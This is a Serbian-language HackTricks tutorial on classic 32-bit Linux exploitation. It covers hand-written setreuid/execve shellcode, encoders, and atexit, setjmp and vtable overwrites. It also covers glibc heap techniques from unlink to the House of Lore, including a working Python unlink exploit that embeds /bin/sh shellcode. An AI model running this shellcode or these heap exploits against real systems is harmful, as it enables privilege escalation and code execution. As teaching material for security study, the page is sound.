# Linux Exploiting (Osnovno)

<details>

<summary><strong>Nauƒçite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Drugi naƒçini podr≈°ke HackTricks-u:

* Ako ≈æelite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili da **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
* Nabavite [**zvaniƒçni PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), na≈°u kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
* **Pridru≈æite se** üí¨ [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.

</details>

## **2.SHELLCODE**

Vidi prekide kernela: cat /usr/include/i386-linux-gnu/asm/unistd\_32.h | grep ‚Äú\_\_NR\_‚Äù

setreuid(0,0); // \_\_NR\_setreuid 70\
execve(‚Äú/bin/sh‚Äù, args\[], NULL); // \_\_NR\_execve 11\
exit(0); // \_\_NR\_exit 1

xor eax, eax ; ƒçistimo eax\
xor ebx, ebx ; ebx = 0 jer nema argumenata za prosleƒëivanje\
mov al, 0x01 ; eax = 1 ‚Äî> \_\_NR\_exit 1\
int 0x80 ; Izvr≈°iti syscall

**nasm -f elf assembly.asm** ‚Äî> Vraƒáa nam .o datoteku\
**ld assembly.o -o shellcodeout** ‚Äî> Daje nam izvr≈°nu datoteku formiranu od asemblerskog koda i mo≈æemo izvuƒái opkodove sa **objdump**\
**objdump -d -Mintel ./shellcodeout** ‚Äî> Da bismo videli da je zaista na≈° shellcode i izvukli OpKodove

**Proverite da li shellcode funkcioni≈°e**
```
char shellcode[] = ‚Äú\x31\xc0\x31\xdb\xb0\x01\xcd\x80‚Äù

void main(){
void (*fp) (void);
fp = (void *)shellcode;
fp();
}<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
Da biste videli da li se sistemski pozivi pravilno izvr≈°avaju, treba da kompajlirate prethodni program i sistemski pozivi treba da se pojave u **strace ./PROGRAMA\_COMPILADO**

Prilikom kreiranja shellcode-ova mo≈æete koristiti trik. Prva instrukcija je skok na poziv. Poziv poziva originalni kod i dodatno stavlja EIP na stek. Nakon instrukcije poziva smo ubacili string koji nam je potreban, tako da sa tim EIP-om mo≈æemo pokazati na string i nastaviti izvr≈°avanje koda.

PRIMER **TRICK (/bin/sh)**:
```
jmp                 0x1f                                        ; Salto al √∫ltimo call
popl                %esi                                       ; Guardamos en ese la direcci√≥n al string
movl               %esi, 0x8(%esi)       ; Concatenar dos veces el string (en este caso /bin/sh)
xorl                 %eax, %eax             ; eax = NULL
movb  %eax, 0x7(%esi)     ; Ponemos un NULL al final del primer /bin/sh
movl               %eax, 0xc(%esi)      ; Ponemos un NULL al final del segundo /bin/sh
movl   $0xb, %eax               ; Syscall 11
movl               %esi, %ebx               ; arg1=‚Äú/bin/sh‚Äù
leal                 0x8(%esi), %ecx      ; arg[2] = {‚Äú/bin/sh‚Äù, ‚Äú0‚Äù}
leal                 0xc(%esi), %edx      ; arg3 = NULL
int                    $0x80                         ; excve(‚Äú/bin/sh‚Äù, [‚Äú/bin/sh‚Äù, NULL], NULL)
xorl                 %ebx, %ebx             ; ebx = NULL
movl   %ebx, %eax
inc                   %eax                          ; Syscall 1
int                    $0x80                         ; exit(0)
call                  -0x24                          ; Salto a la primera instruci√≥n
.string             \‚Äù/bin/sh\‚Äù                               ; String a usar<span id="mce_marker" data-mce-type="bookmark" data-mce-fragment="1">‚Äã</span>
```
**EKSPLOATISANJE kori≈°ƒáenjem Stack-a (/bin/sh):**
```
section .text
global _start
_start:
xor                  eax, eax                     ;Limpieza
mov                al, 0x46                      ; Syscall 70
xor                  ebx, ebx                     ; arg1 = 0
xor                  ecx, ecx                     ; arg2 = 0
int                    0x80                           ; setreuid(0,0)
xor                  eax, eax                     ; eax = 0
push   eax                             ; ‚Äú\0‚Äù
push               dword 0x68732f2f ; ‚Äú//sh‚Äù
push               dword 0x6e69622f; ‚Äú/bin‚Äù
mov                ebx, esp                     ; arg1 = ‚Äú/bin//sh\0‚Äù
push               eax                             ; Null -> args[1]
push               ebx                             ; ‚Äú/bin/sh\0‚Äù -> args[0]
mov                ecx, esp                     ; arg2 = args[]
mov                al, 0x0b                      ; Syscall 11
int                    0x80                           ; excve(‚Äú/bin/sh‚Äù, args[‚Äú/bin/sh‚Äù, ‚ÄúNULL‚Äù], NULL)
```
**EJ FNSTENV:**
```
fabs
fnstenv [esp-0x0c]
pop eax                     ; Guarda el EIP en el que se ejecut√≥ fabs
‚Ä¶
```
**Lovac na jaja:**

Ovo je mali kod koji prolazi kroz stranice memorije povezane s procesom u potrazi za shellcode-om koji je tamo spremljen (tra≈æi neki potpis koji je postavljen u shellcode-u). Korisno u sluƒçajevima kada imate samo malo prostora za ubacivanje koda.

**Polimorfni shellkodovi**

To su ≈°ifrovani shellkodovi koji imaju male kodove koji ih de≈°ifruju i skoƒçe na njih, koristeƒái trik Call-Pop, ovde je **primer Cezarove ≈°ifre**:
```
global _start
_start:
jmp short magic
init:
pop     esi
xor      ecx, ecx
mov    cl,0                              ; Hay que sustituir el 0 por la longitud del shellcode (es lo que recorrer√°)
desc:
sub     byte[esi + ecx -1], 0 ; Hay que sustituir el 0 por la cantidad de bytes a restar (cifrado cesar)
sub     cl, 1
jnz       desc
jmp     short sc
magic:
call init
sc:
;Aqu√≠ va el shellcode
```
## **5. Dodatne metode**





**Muratova tehnika**

Na linuxu se svi programi mapiraju poƒçev≈°i od 0xbfffffff

Posmatrajuƒái kako se konstrui≈°e stek novog procesa u linuxu, mo≈æe se razviti exploit tako da program bude pokrenut u okru≈æenju u kojem je jedina promenljiva shellcode. Adresa ove promenljive se mo≈æe izraƒçunati kao: addr = 0xbfffffff - 4 - strlen(NOMBRE\_ejecutable\_completo) - strlen(shellcode)

Na ovaj naƒçin se na jednostavan naƒçin mo≈æe dobiti adresa gde se nalazi promenljiva okoline sa shellcode.

Ovo se mo≈æe postiƒái zahvaljujuƒái tome ≈°to funkcija execle omoguƒáava kreiranje okru≈æenja koje ima samo ≈æeljene promenljive okoline.



##

###

###

###

###

### **Formatiranje stringova za preplavljivanje bafera**

**sprintf** pomera formatiran string u promenljivu. Stoga, mo≈æete zloupotrebiti formatiranje stringa kako biste izazvali preplavljivanje bafera u promenljivoj u koju se kopira sadr≈æaj. Na primer, payload `%.44xAAAA` ƒáe upisati 44B+"AAAA" u promenljivu, ≈°to mo≈æe izazvati preplavljivanje bafera.

### **Strukture \_\_atexit**

{% hint style="danger" %}
Danas je vrlo retko iskoristiti ovo.
{% endhint %}

**`atexit()`** je funkcija kojoj se prosleƒëuju druge funkcije kao parametri. Ove funkcije ƒáe biti izvr≈°ene prilikom izvr≈°avanja `exit()` ili povratka iz glavnog programa. Ako mo≈æete da modifikujete adresu bilo koje od ovih funkcija da pokazuje na shellcode na primer, preuzete ƒáete kontrolu nad procesom, ali je to trenutno komplikovanije. Trenutno su adrese funkcija koje treba izvr≈°iti sakrivene iza nekoliko struktura i na kraju adrese na koje pokazuju nisu adrese funkcija, veƒá su ≈°ifrovane sa XOR-om i pomerajima sa sluƒçajnim kljuƒçem. Tako da je ovaj vektor napada trenutno vrlo malo koristan, barem na x86 i x64\_86 arhitekturama. Funkcija za ≈°ifrovanje je `PTR_MANGLE`. **Druge arhitekture** poput m68k, mips32, mips64, aarch64, arm, hppa... **ne implementiraju funkciju za ≈°ifrovanje** jer **vraƒáaju isto** ≈°to su primile kao ulaz. Dakle, ove arhitekture bi bile podlo≈æne ovom vektoru napada.

### **setjmp() & longjmp()**

{% hint style="danger" %}
Danas je vrlo retko iskoristiti ovo.
{% endhint %}

**`Setjmp()`** omoguƒáava **ƒçuvanje konteksta** (registara)\
**`longjmp()`** omoguƒáava **obnavljanje konteksta**.\
Saƒçuvani registri su: `EBX, ESI, EDI, ESP, EIP, EBP`\
Ono ≈°to se de≈°ava je da se EIP i ESP prosleƒëuju kroz funkciju **`PTR_MANGLE`**, tako da su **arhitekture podlo≈æne ovom napadu iste kao i gore navedene**.\
Koriste se za oporavak gre≈°aka ili prekide.\
Meƒëutim, prema onome ≈°to sam proƒçitao, ostali registri nisu za≈°tiƒáeni, **tako da ako postoji `call ebx`, `call esi` ili `call edi`** unutar funkcije koja se poziva, kontrola mo≈æe biti preuzeta. Ili takoƒëe mo≈æete modifikovati EBP da biste promenili ESP.

**VTable i VPTR u C++**

Svaka klasa ima **Vtabelu** koja je niz **pokazivaƒça na metode**.

Svaki objekat **klase** ima **VPtr** koji je **pokazivaƒç** na niz svoje klase. VPtr je deo zaglavlja svakog objekta, tako da ako se postigne **prepisivanje** VPtr-a, mo≈æe se **modifikovati** da pokazuje na la≈ænu metodu tako da izvr≈°avanje funkcije ode do shellcode-a.

## **Prevantivne mere i izbegavanja**

###

**Zamena Libsafe-a**

Aktivira se sa: LD\_PRELOAD=/lib/libsafe.so.2\
ili\
‚Äú/lib/libsave.so.2‚Äù > /etc/ld.so.preload

Pozivi nekih nesigurnih funkcija se presreƒáu sigurnijim. Nije standardizovano. (samo za x86, ne za kompilacije sa -fomit-frame-pointer, ne statiƒçke kompilacije, ne sve ranjive funkcije postaju sigurne i LD\_PRELOAD ne radi na binarnim fajlovima sa suid).

**ASCII Armored Address Space**

Sastoji se od uƒçitavanja deljenih biblioteka od 0x00000000 do 0x00ffffff kako bi uvek postojao bajt 0x00. Meƒëutim, ovo zaista ne zaustavlja skoro nijedan napad, a posebno ne u little endian formatu.

**ret2plt**

Sastoji se od izvoƒëenja ROP-a tako da se pozove funkcija strcpy@plt (iz plt-a) i usmeri se ka ulazu u GOT i kopira prvi bajt funkcije koja se ≈æeli pozvati (system()). Zatim se isto radi usmeravajuƒái se ka GOT+1 i kopira se drugi bajt system()... Na kraju se poziva saƒçuvana adresa u GOT koja ƒáe biti system()

**Kavezi sa chroot()**

debootstrap -arch=i386 hardy /home/user ‚Äî> Instalira osnovni sistem u odreƒëeni poddirektorijum

Administrator mo≈æe izaƒái iz ovih kaveza tako ≈°to ƒáe uraditi: mkdir foo; chroot foo; cd ..

**Instrumentacija koda**

Valgrind ‚Äî> Tra≈æi gre≈°ke\
Memcheck\
RAD (Return Address Defender)\
Insure++

## **8 Preplavljivanje hipa: Osnovni eksploiti**

**Dodeljeni blok**

prev\_size |\
size | ‚ÄîZaglavlje\
\*mem | Podaci

**Slobodan blok**

prev\_size |\
size |\
\*fd | Ptr naprednog bloka\
\*bk | Ptr nazadnog bloka ‚ÄîZaglavlje\
\*mem | Podaci

Slobodni blokovi su u listi dvostruko povezanih (bin) i nikada ne mogu biti dva slobodna bloka zajedno (spajaju se)

U "size" postoje bitovi koji pokazuju: Da li je prethodni blok u upotrebi, da li je blok dodeljen putem mmap() i da li blok pripada primarnoj areni.

Ako se oslobodi blok i bilo koji od susednih blokova je slobodan, oni se spajaju pomoƒáu makroa unlink() i novi, veƒái blok se prosleƒëuje frontlink() da ga ubaci u odgovarajuƒái bin.

unlink(){\
BK = P->bk; ‚Äî> BK novog bloka je onaj koji je imao blok koji je veƒá bio slobodan\
FD = P->fd; ‚Äî> FD novog bloka je onaj koji je imao blok koji je veƒá bio slobodan\
FD->bk = BK; ‚Äî> BK sledeƒáeg bloka pokazuje na novi blok\
BK->fd = FD; ‚Äî> FD prethodnog bloka pokazuje na novi blok\
}

Dakle, ako uspemo da modifikujemo P->bk sa adresom shellcode-a i P->fd sa adresom unosa u GOT ili DTORS manje 12, posti≈æe se:

BK = P->bk = \&shellcode\
FD = P->fd = &\_\_dtor\_end\_\_ - 12\
FD->bk = BK -> \*((&\_\_dtor\_end\_\_ - 12) + 12) = \&shellcode

I tako se izvr≈°ava shellcode prilikom izlaska iz programa.

Takoƒëe, 4. izjava unlink() pi≈°e ne≈°to i shellcode mora biti prilagoƒëen za ovo:

BK->fd = FD -> \*(\&shellcode + 8) = (&\_\_dtor\_end\_\_ - 12) ‚Äî> Ovo uzrokuje pisanje 4 bajta poƒçev≈°i od 8. bajta shellcode-a, tako da prva instrukcija shellcode-a mora biti skok kako bi preskoƒçila ovo i pre≈°la na nops koji vode do ostatka shellcode-a.

Stoga se exploit kreira:

U buffer1 ubacujemo shellcode poƒçev≈°i od skoka kako bi pre≈°ao na nops ili na ostatak shellcode-a.

Nakon shellcode-a ubacujemo punjenje dok ne doƒëemo do polja prev\_size i size sledeƒáeg bloka. Na ovim mestima ubacujemo 0xfffffff0 (tako da se prev\_size prepi≈°e da ima bit koji ka≈æe da je slobodan) i ‚Äú-4‚Äú(0xfffffffc) u size (da bi kada proveri u 3. bloku da li je 2. bio slobodan, zapravo ode na modifikovani prev\_size koji ƒáe reƒái da je slobodan) -> Tako kada free() istra≈æuje, iƒái ƒáe na size 3. ali ƒáe zapravo iƒái na 2. - 4 i misliƒáe da je 2. blok slobodan. Tada ƒáe pozvati **unlink()**.
Prilikom poziva unlink() koristiƒáe se prvi podaci iz 2. dela, tako da ƒáe se tu ubaciti adresa koju ≈æelite da prepisujete - 12 (jer ƒáe u FD->bk dodati 12 na adresu saƒçuvanu u FD). Na toj adresi ƒáe se uneti druga adresa koja se nalazi u 2. delu, a koja ƒáe biti adresa shell koda (P->bk la≈æni).

**from struct import \***

**import os**

**shellcode = "\xeb\x0caaaabbbbcccc" #jm 12 + 12 bajtova punjenja**

**shellcode += "\xeb\x1f\x5e\x89\x76\x08\x31\xc0\x88\x46\x07\x89\x46\x0c\xb0\x0b" \\**

**"\x89\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\x31\xdb\x89\xd8\x40\xcd" \\**

**"\x80\xe8\xdc\xff\xff\xff/bin/sh";**

**prev\_size = pack("\<I‚Äù, 0xfffffff0) #Bit koji oznaƒçava da je prethodni deo slobodan treba da bude 1**

**fake\_size = pack("\<I‚Äù, 0xfffffffc) #-4, da bi mislio da je "size" 3. dela 4 bajta unazad (ukazuje na prev\_size) jer tu proverava da li je 2. deo slobodan**

**addr\_sc = pack("\<I", 0x0804a008 + 8) #U payloadu na poƒçetku ƒáemo staviti 8 bajtova punjenja**

**got\_free = pack("\<I", 0x08048300 - 12) #Adresa free() u plt-12 (biƒáe adresa koja ƒáe biti prepisana da bi se pokrenuo shell kod drugi put kada se pozove free)**

**payload = "aaaabbbb" + shellcode + "b"\*(512-len(shellcode)-8) #Kako je reƒçeno, payload poƒçinje sa 8 bajtova punjenja jer tako**

**payload += prev\_size + fake\_size + got\_free + addr\_sc #Menja se 2. deo, got\_free pokazuje gde ƒáemo saƒçuvati adresu addr\_sc + 12**

**os.system("./8.3.o " + payload)**

**unset() oslobaƒëanje u obrnutom redosledu (wargame)**

Kontroli≈°emo 3 uzastopna chunk-a i oslobaƒëaju se u obrnutom redosledu od rezervisanja.

U tom sluƒçaju:

U chunk c se stavlja shell kod

Chunk a koristimo da prepisujemo b tako da size ima deaktiviran bit PREV\_INUSE tako da misli da je chunk a slobodan.

Takoƒëe, u zaglavlju b se prepisuje size da bude -4.

Zatim, program ƒáe misliti da je "a" slobodan i u binu, pa ƒáe pozvati unlink() da ga odvoji. Meƒëutim, po≈°to je PREV\_SIZE u zaglavlju -4, misliƒáe da deo "a" zapravo poƒçinje na b+4. Drugim reƒçima, pozvaƒáe unlink() na deo koji poƒçinje na b+4, tako da ƒáe na b+12 biti pokazivaƒç "fd", a na b+16 ƒáe biti pokazivaƒç "bk".

Na taj naƒçin, ako stavimo adresu shell koda u bk i adresu funkcije "puts()" -12 u fd, imamo na≈° payload.

**Tehnika Frontlink**

Poziva se frontlink kada se ne≈°to oslobodi i nijedan od susednih delova nije slobodan, ne poziva se unlink() veƒá se direktno poziva frontlink().

Korisna ranjivost kada malloc koji se napada nikada nije osloboƒëen (free()).

Potrebno je:

Buffer koji mo≈æe biti preplavljen funkcijom za unos podataka

Buffer koji je susedan ovom koji treba da se oslobodi i ƒçiji ƒáe se polje fd u zaglavlju promeniti zbog prelivanja prethodnog bafera

Buffer koji treba osloboditi sa veliƒçinom veƒáom od 512 ali manjom od prethodnog bafera

Buffer koji je deklarisan pre koraka 3 koji omoguƒáava prepisivanje prev\_size ovog bafera

Na ovaj naƒçin, preplavljujuƒái dva malloc-a na nekontrolisan naƒçin i jedan na kontrolisan naƒçin koji se oslobaƒëa samo jednom, mo≈æemo napraviti eksploit.

**Ranjivost double free()**

Ako se dva puta pozove free() sa istim pokazivaƒçem, dva bin-a pokazuju na istu adresu.

U sluƒçaju da ≈æelimo ponovo koristiti jedan, to se mo≈æe uraditi bez problema. U sluƒçaju da ≈æelimo koristiti drugi, dodeliƒáe se isti prostor, tako da bismo imali la≈æne pokazivaƒçe "fd" i "bk" sa podacima koje ƒáe upisati prethodna rezervacija.

**After free()**

Prethodno osloboƒëeni pokazivaƒç se ponovo koristi bez kontrole.

## **8 Heap Overflow: Napredni eksploiti**

Tehnike Unlink() i FrontLink() su uklonjene modifikacijom funkcije unlink().

**The house of mind**

Samo jedan poziv free() je potreban da bi se izvr≈°io proizvoljni kod. Bitno je pronaƒái drugi deo koji mo≈æe biti preplavljen od strane prethodnog i osloboƒëen.

Poziv free() dovodi do poziva public\_fREe(mem), koji radi:

mstate ar\_ptr;

mchunkptr p;

‚Ä¶

p = mem2chunk(mes); ‚Äî> Vraƒáa pokazivaƒç na adresu na kojoj poƒçinje deo (mem-8)

‚Ä¶

ar\_ptr = arena\_for\_chunk(p); ‚Äî> chunk\_non\_main\_arena(ptr)?heap\_for\_ptr(ptr)->ar\_ptr:\&main\_arena \[1]

‚Ä¶

\_int\_free(ar\_ptr, mem);

}

U \[1] proverava polje size bit NON\_MAIN\_ARENA, koje se mo≈æe promeniti da bi provera vratila taƒçno i izvr≈°ila heap\_for\_ptr() koja vr≈°i and na "mem" ostavljajuƒái 0 poslednjih 2.5 bajtova (u na≈°em sluƒçaju od 0x0804a000 ostavlja 0x08000000) i pristupa 0x08000000->ar\_ptr (kao da je struct heap\_info)

Na ovaj naƒçin, ako mo≈æemo kontrolisati deo na primer na 0x0804a000 i deo na **0x081002a0** ƒáe biti osloboƒëen, mo≈æemo doƒái do adrese 0x08100000 i upisati ≈°ta god ≈æelimo, na primer **0x0804a000**. Kada se ovaj drugi deo oslobodi, naƒái ƒáe da heap\_for\_ptr(ptr)->ar\_ptr vraƒáa ono ≈°to smo upisali na 0x08100000 (jer se primenjuje and na 0x081002a0 koji smo videli ranije i odatle se izvlaƒçi vrednost prvih 4 bajta, ar\_ptr)

Na taj naƒçin se poziva \_int\_free(ar\_ptr, mem), odnosno **\_int\_free(0x0804a000, 0x081002a0)**\
**\_int\_free(mstate av, Void\_t\* mem){**\
‚Ä¶\
bck = unsorted\_chunks(av);\
fwd = bck->fd;\
p->bk = bck;\
p->fd = fwd;\
bck->fd = p;\
fwd->bk = p;

..}

Kao ≈°to smo videli ranije, mo≈æemo kontrolisati vrednost av, jer je to ono ≈°to pi≈°emo u delu koji ƒáe biti osloboƒëen.

Kako je definisano unsorted\_chunks, znamo da:\
bck = \&av->bins\[2]-8;\
fwd = bck->fd = \*(av->bins\[2]);\
fwd->bk = \*(av->bins\[2] + 12) = p;

Stoga, ako u av->bins\[2] upi≈°emo vrednost \_\_DTOR\_END\_\_-12, u poslednjoj instrukciji ƒáe biti upisana vrednost u \_\_DTOR\_END\_\_ adresa drugog dela.

Drugim reƒçima, na poƒçetku prvog dela moramo staviti adresu \_\_DTOR\_END\_\_-12 mnogo puta jer ƒáe av->bins\[2] to izvuƒái.

Na adresi na koju padne adresa drugog dela sa poslednjih 5 nula, treba upisati adresu ovog prvog dela kako bi heap\_for\_ptr() mislio da je ar\_ptr na poƒçetku prvog dela i izvukao av->bins\[2] odatle.
U drugom delu, zahvaljujuƒái prvom, prepisujemo prev\_size sa jump 0x0c i size sa neƒçim ≈°to aktivira -> NON\_MAIN\_ARENA

Zatim u delu 2 stavljamo puno nops-a i na kraju shellcode

Na taj naƒçin ƒáe se pozvati \_int\_free(TROZO1, TROZO2) i slijediti upute za pisanje u \_\_DTOR\_END\_\_ adresu prev\_size od TROZO2 koji ƒáe skoƒçiti na shellcode.

Za primenu ove tehnike potrebno je ispuniti jo≈° neke zahteve koji malo komplikuju payload.

Ova tehnika vi≈°e nije primenjiva jer je primenjen gotovo isti zakrpa kao za unlink. Uporeƒëuju se da li novi sajt na koji se pokazuje takoƒëe pokazuje na njega.

**Fastbin**

To je varijanta The house of mind

interesuje nas izvr≈°avanje sledeƒáeg koda koji se dosti≈æe nakon prve provere funkcije \_int\_free()

fb = &(av->fastbins\[fastbin\_index(size)] ‚Äî> Gde je fastbin\_index(sz) ‚Äî> (sz >> 3) - 2

‚Ä¶

p->fd = \*fb

\*fb = p

Na ovaj naƒçin, ako se postavi u "fb" adresa funkcije u GOT-u, na toj adresi ƒáe se postaviti adresa prepisanog dela. Za ovo ƒáe biti potrebno da je arena blizu adresa dtors-a. Taƒçnije, av->max\_fast treba da bude adresa koju ƒáemo prepisati.

S obzirom da smo sa The House of Mind videli da mi kontroli≈°emo poziciju av.

Zato ako u polje size stavimo veliƒçinu 8 + NON\_MAIN\_ARENA + PREV\_INUSE ‚Äî> fastbin\_index() ƒáe vratiti fastbins\[-1], koji ƒáe pokazivati na av->max\_fast

U ovom sluƒçaju av->max\_fast ƒáe biti adresa koja ƒáe biti prepisana (ne na koju pokazuje, veƒá ta pozicija ƒáe biti prepisana).

Takoƒëe, mora se ispuniti uslov da susedni deo osloboƒëenog dela bude veƒái od 8 -> Po≈°to smo rekli da je veliƒçina osloboƒëenog dela 8, u ovom la≈ænom delu samo treba staviti veliƒçinu veƒáu od 8 (kako ƒáe shellcode biti u osloboƒëenom delu, na poƒçetku treba staviti skok koji ƒáe pasti na nops).

Takoƒëe, isti la≈æni deo mora biti manji od av->system\_mem. av->system\_mem je udaljen 1848 bajtova.

Zbog nula u \_DTOR\_END\_ i malog broja adresa u GOT-u, nijedna adresa iz ovih sekcija nije pogodna za prepisivanje, pa pogledajmo kako primeniti fastbin za napad na stek.

Jo≈° jedan naƒçin napada je preusmeravanje **av** ka steku.

Ako promenimo veliƒçinu da bude 16 umesto 8, tada: fastbin\_index() ƒáe vratiti fastbins\[0] i mo≈æemo iskoristiti ovo da prepisujemo stek.

Za ovo ne sme biti nikakvih canary-ja ili ƒçudnih vrednosti na steku, zapravo moramo biti u ovom: 4 bajta nula + EBP + RET

Potrebna su 4 bajta nula kako bi **av** bio na toj adresi i prvi element **av** je mutex koji mora biti 0.

**av->max\_fast** ƒáe biti EBP i biƒáe vrednost koja ƒáe nam omoguƒáiti da preskoƒçimo ograniƒçenja.

U **av->fastbins\[0]** ƒáe se prepisati adresa **p** i biƒáe RET, tako da ƒáe se skoƒçiti na shellcode.

Takoƒëe, u **av->system\_mem** (1484 bajta iznad pozicije na steku) ƒáe biti dovoljno smeƒáa koje ƒáe nam omoguƒáiti da preskoƒçimo proveru koja se vr≈°i.

Takoƒëe, mora se ispuniti uslov da susedni deo osloboƒëenog dela bude veƒái od 8 -> Po≈°to smo rekli da je veliƒçina osloboƒëenog dela 16, u ovom la≈ænom delu samo treba staviti veliƒçinu veƒáu od 8 (kako ƒáe shellcode biti u osloboƒëenom delu, na poƒçetku treba staviti skok koji ƒáe pasti na nops koji dolaze nakon polja size novog la≈ænog dela).

**The House of Spirit**

U ovom sluƒçaju tra≈æimo da imamo pokazivaƒç na malloc koji mo≈æe biti promenljiv od strane napadaƒça (na primer, da je pokazivaƒç na steku ispod moguƒáeg prelivanja promenljive).

Na taj naƒçin, mogli bismo da usmerimo ovaj pokazivaƒç gde god ≈æelimo. Meƒëutim, ne svako mesto je validno, veliƒçina la≈ænog dela mora biti manja od av->max\_fast i taƒçnije jednaka veliƒçini koja ƒáe biti tra≈æena u buduƒáem pozivu malloc()+8. Zbog toga, ako znamo da se nakon ovog ranjivog pokazivaƒça poziva malloc(40), veliƒçina la≈ænog dela mora biti jednaka 48.

Na primer, ako program pita korisnika za broj, mogli bismo uneti 48 i usmeriti promenljivi pokazivaƒç malloc-a na sledeƒáih 4 bajta (koji bi mogli pripadati EBP-u sa sreƒáom, tako da 48 ostaje iza, kao da je veliƒçina zaglavlja). Takoƒëe, adresa ptr-4+48 mora zadovoljiti nekoliko uslova (u ovom sluƒçaju ptr=EBP), tj. 8 < ptr-4+48 < av->system\_mem.

U sluƒçaju da se ovo ispuni, kada se pozove sledeƒái malloc koji smo rekli da je malloc(40), kao adresi ƒáe biti dodeljena adresa EBP-a. Ukoliko napadaƒç takoƒëe mo≈æe kontrolisati ≈°ta se pi≈°e u ovom malloc-u, mo≈æe prepisati kako EBP tako i EIP sa adresom koju ≈æeli.

Ovo mislim da je zato ≈°to kada se oslobodi free() ƒçuvaƒáe da u adresi koja pokazuje na EBP steka postoji deo taƒçne veliƒçine za novi malloc() koji se ≈æeli rezervisati, pa ƒáe mu dodeliti tu adresu.

**The House of Force**

Potrebno je:

* Prekoraƒçenje u delu koje omoguƒáava prepisivanje wilderness-a
* Poziv malloc() sa veliƒçinom definisanom od strane korisnika
* Poziv malloc() ƒçiji podaci mogu biti definisani od strane korisnika

Prvo ≈°to se radi je prepisivanje veliƒçine dela wilderness sa veoma velikom vredno≈°ƒáu (0xffffffff), tako da ƒáe svaki zahtev za memorijom dovoljno velik biti obraƒëen u \_int\_malloc() bez potrebe za pro≈°irivanjem hipa.

Drugo je promena av->top tako da pokazuje na deo memorije pod kontrolom napadaƒça, kao ≈°to je stek. U av->top ƒáe se postaviti \&EIP - 8.

Mora se prepisati av->top kako bi pokazivao na deo memorije pod kontrolom napadaƒça:

victim = av->top;

remainder = chunck\_at\_offset(victim, nb);

av->top = remainder;

Victim uzima vrednost adrese trenutnog dela wilderness-a (trenutni av->top) i remainder je taƒçno suma te adrese plus koliƒçina bajtova tra≈æena od strane malloc(). Dakle, ako je \&EIP-8 na 0xbffff224 i av->top sadr≈æi 0x080c2788, tada je koliƒçina koju moramo rezervisati u kontrolisanom malloc-u kako bi av->top pokazivao na $EIP-8 za sledeƒái malloc():

0xbffff224 - 0x080c2788 = 3086207644.

Na taj naƒçin ƒáe se saƒçuvati promenjena vrednost u av->top i sledeƒái malloc ƒáe pokazivati na EIP i moƒái ƒáe ga prepisati.

Va≈æno je znati da veliƒçina novog dela wilderness bude veƒáa od zahteva poslednjeg malloc(). Drugim reƒçima, ako wilderness pokazuje na \&EIP-8, veliƒçina ƒáe biti taƒçno u polju EBP steka.

**The House of Lore**

**Korupcija SmallBin**

Osloboƒëeni delovi se ubacuju u bin u zavisnosti od njihove veliƒçine. Ali pre nego ≈°to se ubace, ƒçuvaju se u unsorted bins. Deo koji je osloboƒëen neƒáe odmah biti ubaƒçen u svoj bin veƒá ƒáe ostati u unsorted bins. Zatim, ako se rezervi≈°e novi deo i prethodno osloboƒëeni mo≈æe poslu≈æiti, biƒáe vraƒáen, ali ako se rezervi≈°e veƒái deo, osloboƒëeni deo u unsorted bins ƒáe biti ubaƒçen u odgovarajuƒái bin.

Da bi se do≈°lo do ranjivog koda, zahtev za memorijom mora biti veƒái od av->max\_fast (obiƒçno 72) i manji od MIN\_LARGE\_SIZE (512).
Ako u binu postoji komad odgovarajuƒáe veliƒçine zahtevanog, vraƒáa se taj nakon ≈°to se odvoji:

bck = victim->bk; Pokazuje na prethodni komad, jedina informacija koju mo≈æemo promeniti.

bin->bk = bck; Pretposlednji komad postaje poslednji, u sluƒçaju da bck pokazuje na stack sledeƒáeg rezervisanog komada, dodeliƒáe mu se ova adresa.

bck->fd = bin; Lista se zatvara tako ≈°to ovaj pokazuje na bin

Potrebno je:

Da se rezervi≈°u dva malloc-a, tako da se prvom mo≈æe izazvati prelivanje nakon ≈°to je drugi osloboƒëen i ubaƒçen u svoj bin (tj. rezervisan je malloc veƒái od drugog komada pre prelivanja)

Da malloc rezervisan za koji je odabrana adresa od strane napadaƒça bude kontrolisan od strane napadaƒça.

Cilj je sledeƒái, ako mo≈æemo izazvati prelivanje na heap-u koji ima ispod sebe komad veƒá osloboƒëen i u svom binu, mo≈æemo promeniti njegov pokazivaƒç bk. Ako promenimo njegov pokazivaƒç bk i ovaj komad postane prvi na listi bin i rezervi≈°e se, bin ƒáe biti prevaren i reƒái ƒáe mu se da je poslednji komad liste (sledeƒái koji nudi) na la≈ænoj adresi koju smo postavili (na stack ili GOT na primer). Zbog toga, ako se ponovo rezervi≈°e drugi komad i napadaƒç ima dozvole na njemu, dobiƒáe komad na ≈æeljenoj poziciji i moƒái ƒáe da pi≈°e u njega.

Nakon ≈°to se modifikovani komad oslobodi, potrebno je rezervisati komad veƒái od osloboƒëenog, tako da modifikovani komad izaƒëe iz unsorted binova i ubaci se u svoj bin.

Kada se naƒëe u svom binu, vreme je da se promeni njegov pokazivaƒç bk preko prelivanja kako bi pokazivao na adresu koju ≈æelimo da prepisujemo.

Tako bin mora da saƒçeka da se dovoljno puta pozove malloc() kako bi se ponovo koristio modifikovani bin i prevario bin tako ≈°to ƒáe mu se reƒái da je sledeƒái komad na la≈ænoj adresi. Zatim ƒáe biti dat komad koji nas zanima.

